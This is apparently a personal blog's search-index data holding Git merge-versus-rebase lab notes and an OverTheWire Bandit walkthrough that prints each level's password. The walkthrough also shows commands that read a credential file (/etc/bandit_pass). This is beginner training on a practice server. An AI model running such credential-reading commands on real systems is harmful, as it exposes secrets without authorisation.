\u0026#34;Merged main fixed conflict.\u0026#34; [greet 7913c56] Merged main fixed conflict. ➜ hello git:(greet) I attempted to merge the main branch into the greet branch, which resulted in a merge conflict in lib/hello.rb. I resolved the conflict by editing the file to combine both changes, then staged and committed the resolved file. The commit history was updated to reflect the merge resolution.\nLab 31 # Let’s explore the differences between merging and rebasing. In order to do so, we need to rewind the repository back in time before the first merge, and then redo the same steps, but using rebasing rather than merging.\nWe will make use the of the reset command to wind the branches back in time.\nLab 32 # ➜ hello git:(greet) gco greet Already on \u0026#39;greet\u0026#39; ➜ hello git:(greet) git hist * 7913c56 2025-06-03 | Merged main fixed conflict. (HEAD -\u0026gt; greet) [D3LET3-57] |\\ | * 1277033 2025-06-03 | Made interactive (main) [D3LET3-57] * | 58c0382 2025-06-03 | Merge branch \u0026#39;main\u0026#39; into greet [D3LET3-57] |\\| | * 895a1b8 2025-06-03 | Added README [D3LET3-57] * | cb4831a 2025-06-03 | Updated Rakefile [D3LET3-57] * | e64c2f8 2025-06-03 | Hello uses Greeter [D3LET3-57] * | 047fc2b 2025-06-03 | Added a greeter class [D3LET3-57] |/ * 4dbc382 2025-06-03 | Added a Rakefile [D3LET3-57] * 20e3e36 2025-06-03 | Moved hello.rb to lib [D3LET3-57] * 85af29c 2025-06-03 | Add an author/email comment [D3LET3-57] * 5f9df6a 2025-06-03 | Added a comment (tag: v1) [D3LET3-57] * 0a4623a 2025-06-03 | Added a default value (tag: v1-beta) [D3LET3-57] * 0136159 2025-06-03 | Using ARGV [D3LET3-57] * 8c91514 2025-06-03 | First Commit [D3LET3-57] #That’s a bit hard to read, but looking at the data we see that the “Updated Rakefile” commit was the last commit on the greet branch before merging. Let’s reset the greet branch to that commit. ➜ hello git:(greet) git reset --hard cb4831a HEAD is now at cb4831a Updated Rakefile ➜ hello git:(greet) git hist --all * 1277033 2025-06-03 | Made interactive (main) [D3LET3-57] * 895a1b8 2025-06-03 | Added README [D3LET3-57] | * cb4831a 2025-06-03 | Updated Rakefile (HEAD -\u0026gt; greet) [D3LET3-57] | * e64c2f8 2025-06-03 | Hello uses Greeter [D3LET3-57] | * 047fc2b 2025-06-03 | Added a greeter class [D3LET3-57] |/ * 4dbc382 2025-06-03 | Added a Rakefile [D3LET3-57] * 20e3e36 2025-06-03 | Moved hello.rb to lib [D3LET3-57] * 85af29c 2025-06-03 | Add an author/email comment [D3LET3-57] * 5f9df6a 2025-06-03 | Added a comment (tag: v1) [D3LET3-57] * 0a4623a 2025-06-03 | Added a default value (tag: v1-beta) [D3LET3-57] * 0136159 2025-06-03 | Using ARGV [D3LET3-57] * 8c91514 2025-06-03 | First Commit [D3LET3-57] The greet branch has been reset to the commit before the merge, which is cb4831a. The commit history now shows that the greet branch is at the same point as it was before the merge, with no merge commits present.\nLab 33 # ➜ hello git:(main) git reset --hard 895a1b8 HEAD is now at 895a1b8 Added README ➜ hello git:(main) git hist --all * 895a1b8 2025-06-03 | Added README (HEAD -\u0026gt; main) [D3LET3-57] | * cb4831a 2025-06-03 | Updated Rakefile (greet) [D3LET3-57] | * e64c2f8 2025-06-03 | Hello uses Greeter [D3LET3-57] | * 047fc2b 2025-06-03 | Added a greeter class [D3LET3-57] |/ * 4dbc382 2025-06-03 | Added a Rakefile [D3LET3-57] * 20e3e36 2025-06-03 | Moved hello.rb to lib [D3LET3-57] * 85af29c 2025-06-03 | Add an author/email comment [D3LET3-57] * 5f9df6a 2025-06-03 | Added a comment (tag: v1) [D3LET3-57] * 0a4623a 2025-06-03 | Added a default value (tag: v1-beta) [D3LET3-57] * 0136159 2025-06-03 | Using ARGV [D3LET3-57] * 8c91514 2025-06-03 | First Commit [D3LET3-57] The ‘Added README’ commit is the one directly before the conflicting interactive mode. We will reset the main branch to ‘Added README’ commit.\nLab 34 # ➜ hello git:(main) gco greet Switched to branch \u0026#39;greet\u0026#39; ➜ hello git:(greet) git rebase main Successfully rebased and updated refs/heads/greet. ➜ hello git:(greet) git hist * 07fb1d7 2025-06-03 | Updated Rakefile (HEAD -\u0026gt; greet) [D3LET3-57] * 8540dcb 2025-06-03 | Hello uses Greeter [D3LET3-57] * 9dc4ab9 2025-06-03 | Added a greeter class [D3LET3-57] * 895a1b8 2025-06-03 | Added README (main) [D3LET3-57] * 4dbc382 2025-06-03 | Added a Rakefile [D3LET3-57] * 20e3e36 2025-06-03 | Moved hello.rb to lib [D3LET3-57] * 85af29c 2025-06-03 | Add an author/email comment [D3LET3-57] * 5f9df6a 2025-06-03 | Added a comment (tag: v1) [D3LET3-57] * 0a4623a 2025-06-03 | Added a default value (tag: v1-beta) [D3LET3-57] * 0136159 2025-06-03 | Using ARGV [D3LET3-57] * 8c91514 2025-06-03 | First Commit [D3LET3-57] Merge v/s Rebase\nThe greet branch has been successfully rebased onto the main branch. The commit history now shows that the commits from the greet branch have been applied on top of the main branch, creating a linear history without any merge commits. This makes the history cleaner and easier to follow.\nLab 35 # ➜ hello git:(greet) gco main Switched to branch \u0026#39;main\u0026#39; ➜ hello git:(main) gm greet Updating 895a1b8..07fb1d7 Fast-forward Rakefile | 3 +-- lib/greeter.rb | 8 ++++++++ lib/hello.rb | 10 ++++++---- 3 files changed, 15 insertions(+), 6 deletions(-) create mode 100644 lib/greeter.rb ➜ hello git:(main) git hist * 07fb1d7 2025-06-03 | Updated Rakefile (HEAD -\u0026gt; main, greet) [D3LET3-57] * 8540dcb 2025-06-03 | Hello uses Greeter [D3LET3-57] * 9dc4ab9 2025-06-03 | Added a greeter class [D3LET3-57] * 895a1b8 2025-06-03 | Added README [D3LET3-57] * 4dbc382 2025-06-03 | Added a Rakefile [D3LET3-57] * 20e3e36 2025-06-03 | Moved hello.rb to lib [D3LET3-57] * 85af29c 2025-06-03 | Add an author/email comment [D3LET3-57] * 5f9df6a 2025-06-03 | Added a comment (tag: v1) [D3LET3-57] * 0a4623a 2025-06-03 | Added a default value (tag: v1-beta) [D3LET3-57] * 0136159 2025-06-03 | Using ARGV [D3LET3-57] * 8c91514 2025-06-03 | First Commit [D3LET3-57] Because the head of main is a direct ancestor of the head of the greet branch, git is able to do a fast-forward merge. When fast-forwarding, the branch pointer is simply moved forward to point to the same commit as the greeter branch.\nThere will never be conflicts in a fast-forward merge. Unlike a merge, rebasing does not create a new commit. Instead, it rewrites the commit history by applying the changes from one branch onto another. This results in a cleaner, linear history without merge commits, making it easier to understand the project’s evolution.\nReferences # Git Immersion ","date":"2025-06-03","externalUrl":null,"permalink":"/posts/git_immersion/","section":"","summary":"Introducing Git: the version control system that makes coding feel like a walk in the park\u0026hellip; with occasional rain.","title":"Git Immersion: A Deep Dive into Version Control","type":"posts"},{"content":"","date":"2025-06-03","externalUrl":null,"permalink":"/categories/linux/","section":"Categories","summary":"","title":"Linux","type":"categories"},{"content":"","date":"2025-06-03","externalUrl":null,"permalink":"/categories/overthewire/","section":"Categories","summary":"","title":"OverTheWire","type":"categories"},{"content":" My solutions for Bandit - OverTheWire.org # Bandit Level 0 # ssh bandit0@bandit.labs.overthewire.org -p 2220 Connect to the server using the provided command. The password is bandit0. Password for Bandit Level 1 is found in the file readme in the home directory of Bandit Level 0. Password: ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If\nBandit Level 1 # bandit1@bandit:~$ cat /home/bandit1/- 263JGJPfgU6LtdEvgfWU1XP5yac29mFx Password for Bandit Level 2 is found in the file - in the home directory of Bandit Level 1. Password: 263JGJPfgU6LtdEvgfWU1XP5yac29mFx\nBandit Level 2 # bandit2@bandit:~$ cat spaces\\ in\\ this\\ filename MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx Password for Bandit Level 3 is found in the file spaces in this filename in the home directory of Bandit Level 2.\nPassword: MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx\nBandit Level 3 # bandit3@bandit:~/inhere$ ls -la total 12 drwxr-xr-x 2 root root 4096 Apr 10 14:23 . drwxr-xr-x 3 root root 4096 Apr 10 14:23 .. -rw-r----- 1 bandit4 bandit3 33 Apr 10 14:23 ...Hiding-From-You bandit3@bandit:~/inhere$ cat ...Hiding-From-You 2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ Password for Bandit Level 4 is found in the file ...Hiding-From-You in the home directory of Bandit Level 3. Password: 2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ\nBandit Level 4 # We will use the file command to get the information about the files. From files command, we now know that the file07 contains ASCII text\nbandit4@bandit:~/inhere$ file ./* ./-file00: PGP Secret Sub-key - ./-file01: data ./-file02: data ./-file03: data ./-file04: data ./-file05: data ./-file06: data ./-file07: ASCII text ./-file08: data ./-file09: data bandit4@bandit:~/inhere$ cat ./-file07 4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw Password: 4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw\nBandit Level 5 # bandit5@bandit:~/inhere$ find . -size 1033c ./maybehere07/.file2 bandit5@bandit:~/inhere$ cat ./maybehere07/.file2 HWasnPhtq9AVKe0dmk45nxy20cvUa6EG Used -size flag to find the file with size 1033 bytes. The file is located in maybehere07 directory Password: HWasnPhtq9AVKe0dmk45nxy20cvUa6EG\nBandit Level 6 # bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c /var/lib/dpkg/info/bandit7.password bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj Used the find command to locate files owned by user bandit7 and group bandit6 with a size of 33 bytes, starting from the root directory. The password file was found at /var/lib/dpkg/info/bandit7.password. Password: morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj\nBandit Level 7 # bandit7@bandit:~$ ls data.txt bandit7@bandit:~$ file data.txt data.txt: Unicode text, UTF-8 text bandit7@bandit:~$ cat data.txt | grep \u0026#34;millionth\u0026#34; millionth\tdfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc bandit7@bandit:~$ Used the file command to check the type of data.txt, which revealed it was a Unicode text file. Then, used grep to search for the string \u0026ldquo;millionth\u0026rdquo; in the file, which returned the password. Password: dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc\nBandit Level 8 # bandit8@bandit:~$ file data.txt data.txt: ASCII text bandit8@bandit:~$ cat data.txt | sort |less bandit8@bandit:~$ cat data.txt | sort | uniq -u 4CKMh1JI91bUIZZPXDqGanal4xvAg0JM Used the file command to check the type of data.txt, which revealed it was an ASCII text file. Then, used sort to order the lines, and uniq -u to print only the unique line (the password). The -u option ensures only lines that appear exactly once are shown, filtering out any duplicates. Password: 4CKMh1JI91bUIZZPXDqGanal4xvAg0JM\nBandit Level 9 # bandit9@bandit:~$ file data.txt data.txt: data bandit9@bandit:~$ cat data.txt | grep \u0026#34;====\u0026#34; grep: (standard input): binary file matches bandit9@bandit:~$ strings data.txt | grep \u0026#34;==\u0026#34; ========== the ========== password{k =========== is ========== FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey Used the file command to check the type of data.txt, which revealed it was a binary file. Then, used strings to extract printable strings from the binary file and grep to search for lines containing \u0026ldquo;==\u0026rdquo;. This returned the password. Password: FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey\nBandit Level 10 # bandit10@bandit:~$ cat data.txt VGhlIHBhc3N3b3JkIGlzIGR0UjE3M2ZaS2IwUlJzREZTR3NnMlJXbnBOVmozcVJyCg== bandit10@bandit:~$ cat data.txt | base64 --decode The password is dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr Used base64 --decode to decode the base64 encoded string in data.txt, which revealed the password. Password: dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr\nBandit Level 11 # bandit11@bandit:~$ cat data.txt Gur cnffjbeq vf 7k16JArUVv5LxVuJfsSVdbbtaHGlw9D4 Used an online ROT13 decoder to decode the string in data.txt, which revealed the password. Password: 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4\nBandit Level 12 # bandit12@bandit:~$ mkdir /tmp/d3let3 bandit12@bandit:~$ cp data.txt /tmp/d3let3 bandit12@bandit:~$ cd /tmp/d3let3 bandit12@bandit:/tmp/d3let3$ ls data.txt bandit12@bandit:/tmp/d3let3$ xxd -r data.txt data bandit12@bandit:/tmp/d3let3$ gzip -d data gzip: data: unknown suffix -- ignored bandit12@bandit:/tmp/d3let3$ mv data txt.gz bandit12@bandit:/tmp/d3let3$ gzip -d txt.gz bandit12@bandit:/tmp/d3let3$ cat txt bandit12@bandit:/tmp/d3let3$ file txt txt: bzip2 compressed data, block size = 900k bandit12@bandit:/tmp/d3let3$ mv txt txxt.bz2 bandit12@bandit:/tmp/d3let3$ bzip2 -d txxt.bz2 bandit12@bandit:/tmp/d3let3$ file txxt txxt: gzip compressed data, was \u0026#34;data4.bin\u0026#34;, last modified: Thu Apr 10 14:22:57 2025, max compression, from Unix, original size modulo 2^32 20480 bandit12@bandit:/tmp/d3let3$ mv txxt d4ta.gz bandit12@bandit:/tmp/d3let3$ gzip -d d4ta.gz bandit12@bandit:/tmp/d3let3$ file d4ta d4ta: POSIX tar archive (GNU) bandit12@bandit:/tmp/d3let3$ tar -xvf d4ta data5.bin bandit12@bandit:/tmp/d3let3$ file data5.bin data5.bin: POSIX tar archive (GNU) bandit12@bandit:/tmp/d3let3$ tar -xvf data5.bin data6.bin bandit12@bandit:/tmp/d3let3$ file data6.bin data6.bin: bzip2 compressed data, block size = 900k bandit12@bandit:/tmp/d3let3$ mv data6.bin data6.bz bandit12@bandit:/tmp/d3let3$ bzip -d data6.bz Command \u0026#39;bzip\u0026#39; not found, but there are 21 similar ones. bandit12@bandit:/tmp/d3let3$ bzip2 -d data6.bz bandit12@bandit:/tmp/d3let3$ file data6 data6: POSIX tar archive (GNU) bandit12@bandit:/tmp/d3let3$ tar -xvf data6 data8.bin bandit12@bandit:/tmp/d3let3$ file data8.bin data8.bin: gzip compressed data, was \u0026#34;data9.bin\u0026#34;, last modified: Thu Apr 10 14:22:57 2025, max compression, from Unix, original size modulo 2^32 49 bandit12@bandit:/tmp/d3let3$ mv data8.bin data8.gz bandit12@bandit:/tmp/d3let3$ gzip -d data8.gz bandit12@bandit:/tmp/d3let3$ file data8 data8: ASCII text bandit12@bandit:/tmp/d3let3$ cat data8 The password is FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn Used a series of commands to decode and extract the password from the file data.txt. The process involved creating a temporary directory, copying the file, using xxd to reverse the hex dump, decompressing with gzip, renaming files, and finally extracting the password from the last file. Password: FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn\nBandit Level 13 # bandit13@bandit:~$ ssh -i sshkey.private -p 2220 bandit14@localhost bandit14@bandit:~$ cat /etc/bandit_pass/bandit14 MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS Used the private SSH key sshkey.private to connect to Bandit Level 14. The password for Bandit Level 14 is found in the file /etc/bandit_pass/bandit14. Password: MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS\nBandit Level 14 # bandit14@bandit:~$ nc localhost 30000 MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS Correct! 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo ^C bandit14@bandit:~$ Used nc (netcat) to connect to localhost on port 30000. The server prompts for the password, which is the same as the previous level\u0026rsquo;s password. After entering the correct password, it returns the new password. Password: 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo\nBandit Level 15 # bandit15@bandit:~$ openssl s_client -connect localhost:30001 CONNECTED(00000003) Can\u0026#39;t use SSL_get_servername depth=0 CN = SnakeOil verify error:num=18:self-signed certificate verify return:1 depth=0 CN = SnakeOil verify return:1 --- Certificate chain 0 s:CN = SnakeOil i:CN = SnakeOil a:PKEY: rsaEncryption, 4096 (bit); sigalg: RSA-SHA256 v:NotBefore: Jun 10 03:59:50 2024 GMT; NotAfter: Jun 8 03:59:50 2034 GMT --- Server certificate -----BEGIN CERTIFICATE----- MIIFBzCCAu+gAwIBAgIUBLz7DBxA0IfojaL/WaJzE6Sbz7cwDQYJKoZIhvcNAQEL BQAwEzERMA8GA1UEAwwIU25ha2VPaWwwHhcNMjQwNjEwMDM1OTUwWhcNMzQwNjA4 MDM1OTUwWjATMREwDwYDVQQDDAhTbmFrZU9pbDCCAiIwDQYJKoZIhvcNAQEBBQAD ggIPADCCAgoCggIBANI+P5QXm9Bj21FIPsQqbqZRb5XmSZZJYaam7EIJ16Fxedf+ jXAv4d/FVqiEM4BuSNsNMeBMx2Gq0lAfN33h+RMTjRoMb8yBsZsC063MLfXCk4p+ 09gtGP7BS6Iy5XdmfY/fPHvA3JDEScdlDDmd6Lsbdwhv93Q8M6POVO9sv4HuS4t/ jEjr+NhE+Bjr/wDbyg7GL71BP1WPZpQnRE4OzoSrt5+bZVLvODWUFwinB0fLaGRk GmI0r5EUOUd7HpYyoIQbiNlePGfPpHRKnmdXTTEZEoxeWWAaM1VhPGqfrB/Pnca+ vAJX7iBOb3kHinmfVOScsG/YAUR94wSELeY+UlEWJaELVUntrJ5HeRDiTChiVQ++ wnnjNbepaW6shopybUF3XXfhIb4NvwLWpvoKFXVtcVjlOujF0snVvpE+MRT0wacy tHtjZs7Ao7GYxDz6H8AdBLKJW67uQon37a4MI260ADFMS+2vEAbNSFP+f6ii5mrB 18cY64ZaF6oU8bjGK7BArDx56bRc3WFyuBIGWAFHEuB948BcshXY7baf5jjzPmgz mq1zdRthQB31MOM2ii6vuTkheAvKfFf+llH4M9SnES4NSF2hj9NnHga9V08wfhYc x0W6qu+S8HUdVF+V23yTvUNgz4Q+UoGs4sHSDEsIBFqNvInnpUmtNgcR2L5PAgMB AAGjUzBRMB0GA1UdDgQWBBTPo8kfze4P9EgxNuyk7+xDGFtAYzAfBgNVHSMEGDAW gBTPo8kfze4P9EgxNuyk7+xDGFtAYzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3 DQEBCwUAA4ICAQAKHomtmcGqyiLnhziLe97Mq2+Sul5QgYVwfx/KYOXxv2T8ZmcR Ae9XFhZT4jsAOUDK1OXx9aZgDGJHJLNEVTe9zWv1ONFfNxEBxQgP7hhmDBWdtj6d taqEW/Jp06X+08BtnYK9NZsvDg2YRcvOHConeMjwvEL7tQK0m+GVyQfLYg6jnrhx egH+abucTKxabFcWSE+Vk0uJYMqcbXvB4WNKz9vj4V5Hn7/DN4xIjFko+nREw6Oa /AUFjNnO/FPjap+d68H1LdzMH3PSs+yjGid+6Zx9FCnt9qZydW13Miqg3nDnODXw +Z682mQFjVlGPCA5ZOQbyMKY4tNazG2n8qy2famQT3+jF8Lb6a4NGbnpeWnLMkIu jWLWIkA9MlbdNXuajiPNVyYIK9gdoBzbfaKwoOfSsLxEqlf8rio1GGcEV5Hlz5S2 txwI0xdW9MWeGWoiLbZSbRJH4TIBFFtoBG0LoEJi0C+UPwS8CDngJB4TyrZqEld3 rH87W+Et1t/Nepoc/Eoaux9PFp5VPXP+qwQGmhir/hv7OsgBhrkYuhkjxZ8+1uk7 tUWC/XM0mpLoxsq6vVl3AJaJe1ivdA9xLytsuG4iv02Juc593HXYR8yOpow0Eq2T U5EyeuFg5RXYwAPi7ykw1PW7zAPL4MlonEVz+QXOSx6eyhimp1VZC11SCg== -----END CERTIFICATE----- subject=CN = SnakeOil issuer=CN = SnakeOil --- No client certificate CA names sent Peer signing digest: SHA256 Peer signature type: RSA-PSS Server Temp Key: X25519, 253 bits --- SSL handshake has read 2103 bytes and written 373 bytes Verification error: self-signed certificate --- New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384 Server public key is 4096 bit Secure Renegotiation IS NOT supported Compression: NONE Expansion: NONE No ALPN negotiated Early data was not sent Verify return code: 18 (self-signed certificate) --- --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: 68C81752B64BEF2EDBEEE104C3E43CE1A85B8CED5573A2621DF10DD4BB4E026A Session-ID-ctx: Resumption PSK: D5EE94BABC7C01AF9FAAD92CD58927794DCB1661BD92F968F4AC11C87751F3B5DCECA5598C3828167F69241A98F23452 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 300 (seconds) TLS session ticket: 0000 - 90 26 4b 61 3e 89 95 1a-4b 9c 04 1b 5a 25 70 8d .\u0026amp;Ka\u0026gt;...K...Z%p. 0010 - 9b e7 47 fc b3 e2 2a fd-e2 be 05 14 24 01 28 0d ..G...*.....$.(. 0020 - e0 c4 33 a6 fc 30 ce d7-f1 b1 36 37 00 90 a8 26 ..3..0....67...\u0026amp; 0030 - a0 8e 8a eb 20 9c 19 fb-ba 08 85 c4 b9 cc 0c e0 .... ........... 0040 - cc a9 7b f1 1c 73 65 35-dc 97 66 20 9e d3 76 20 ..{..se5..f ..v 0050 - f0 29 04 21 6e c3 26 b6-10 db 1d be 9d 1d 8f b4 .).!n.\u0026amp;......... 0060 - bd cd 71 03 f9 d8 4a ae-9f ff f2 66 d7 e3 26 a2 ..q...J....f..\u0026amp;. 0070 - 81 8a 59 ec d4 1f 2c d7-43 63 58 cf 51 fc fe 5b ..Y...,.CcX.Q..[ 0080 - 0e 7d 67 42 52 01 36 20-cc 18 4c 72 cc 94 91 1f .}gBR.6 ..Lr.... 0090 - 61 d8 3b 49 6a 93 ef 43-19 61 af 74 7a 09 51 8c a.;Ij..C.a.tz.Q. 00a0 - 0b ea 02 b5 28 08 f1 a9-57 5a 0c 7a 96 1d a8 19 ....(...WZ.z.... 00b0 - f3 ab fc ef 25 e9 f1 99-f4 7f e4 a9 46 84 4b 76 ....%.......F.Kv 00c0 - 3f 02 27 6e e4 a2 05 23-0f 00 ab d2 a3 46 54 b8 ?.\u0026#39;n...#.....FT. 00d0 - fe 8a 5d 43 6e 4b a4 35-8b bd 3d 1d 0a 52 18 9b ..]CnK.5..=..R.. Start Time: 1748921757 Timeout : 7200 (sec) Verify return code: 18 (self-signed certificate) Extended master secret: no Max Early Data: 0 --- read R BLOCK --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: 406F9FED595D10EB429D57EB4CC0965D24E5355FBF5859C38E29C2BCEE4B5FF7 Session-ID-ctx: Resumption PSK: E5E19083A209E4154DEED6BC5E7C82F9548222E8ADDB491A5C273FA65CE7E70A7B3EAC6D4F2AF8594B4476BB423C096F PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 300 (seconds) TLS session ticket: 0000 - 90 26 4b 61 3e 89 95 1a-4b 9c 04 1b 5a 25 70 8d .\u0026amp;Ka\u0026gt;...K...Z%p. 0010 - 78 23 7e 72 59 10 2d 55-07 81 d7 85 45 f5 9a c5 x#~rY.-U....E... 0020 - ed fc e2 8c 1f 65 ce 69-c0 05 86 49 16 ac 16 64 .....e.i...I...d 0030 - a3 bb 85 18 d3 03 e0 bc-32 39 7b 24 ec bd f4 47 ........29{$...G 0040 - 58 9d e5 e9 83 89 84 fe-ab 22 d1 bb 3c 98 e2 03 X........\u0026#34;..\u0026lt;... 0050 - d9 fc 2d 6c 1b 44 1c ed-c8 1f 3f 26 be 50 10 88 ..-l.D....?\u0026amp;.P.. 0060 - cd f0 57 3e ae 14 f0 36-10 17 6b b6 01 69 46 11 ..W\u0026gt;...6..k..iF. 0070 - 9e e2 07 3a c9 a0 0e 26-29 c3 2c 65 b8 3e 81 90 ...:...\u0026amp;).,e.\u0026gt;.. 0080 - a4 18 59 65 8c c7 33 05-50 5e 09 8f 2a 12 90 c1 ..Ye..3.P^..*... 0090 - 14 c8 39 9c ed 5f 73 dc-11 9e 7a d8 73 68 31 63 ..9.._s...z.sh1c 00a0 - 90 68 53 b5 61 f4 bb f3-24 0d f1 4a c8 1e f8 e8 .hS.a...$..J.... 00b0 - ff 98 93 b4 ab d2 66 9a-67 b0 a5 5f 77 f5 46 44 ......f.g.._w.FD 00c0 - d9 c1 41 15 8c 9d 1d 62-a2 5f da 1e db ed ee 31 ..A....b._.....1 00d0 - cd 94 c8 b5 fd d7 12 16-20 d1 f5 84 bb 4f d2 f7 ........ ....O.. Start Time: 1748921757 Timeout : 7200 (sec) Verify return code: 18 (self-signed certificate) Extended master secret: no Max Early Data: 0 --- read R BLOCK 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo Correct! kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx closed bandit15@bandit:~$ Used openssl s_client to connect to localhost on port 30001. The server presents a self-signed certificate, which is accepted despite the verification error. After entering the correct password, it returns the new password. Password: kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx\n","date":"2025-06-03","externalUrl":null,"permalink":"/posts/otw/","section":"","summary":"This post covers the solutions for all levels of the OverTheWire Bandit game, from Level 0 to Level 15.This is a comprehensive guide to help you navigate through the challenges and learn essential Linux commands and concepts.","title":"OverTheWire: Bandit (Level 0 - 15)","type":"posts"},{"content":"","date":"2025-06-03","externalUrl":null,"permalink":"/tags/version-control/","section":"Tags","summary":"","title":"Version Control","type":"tags"},{"content":"","date":"2025-06-03","externalUrl":null,"permalink":"/categories/version-control/","section":"Categories","summary":"","title":"Version Control","type":"categories"},{"content":"","date":"2025-05-25","externalUrl":null,"permalink":"/tags/blogging/","section":"Tags","summary":"","title":"Blogging","type":"tags"},{"content":"","date":"2025-05-25","externalUrl":null,"permalink":"/tags/first-post/","section":"Tags","summary":"","title":"First Post","type":"tags"},{"content":"","date":"2025-05-25","externalUrl":null,"permalink":"/categories/introduction/","section":"Categories","summary":"","title":"Introduction","type":"categories"},{"content":" Hello World 👋 # Welcome to my very first post!\nI finally made a website. Took only 327 cups of coffee, 42 bug fixes, and a minor existential crisis.\nNot much here yet, but stick around — things are about to get mildly interesting (hopefully).\nWhy did I make this site?\nBecause yelling my thoughts into the void wasn’t getting enough traction.\nStay tuned for more chaos, code, and probably more bad jokes.\nPosted on: May 24, 2025\n","date":"2025-05-25","externalUrl":null,"permalink":"/posts/first_post/","section":"","summary":"Welcome to my very first post!","title":"My first post","type":"posts"},{"content":"","date":"2025-05-25","externalUrl":null,"permalink":"/tags/personal/","section":"Tags","summary":"","title":"Personal","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]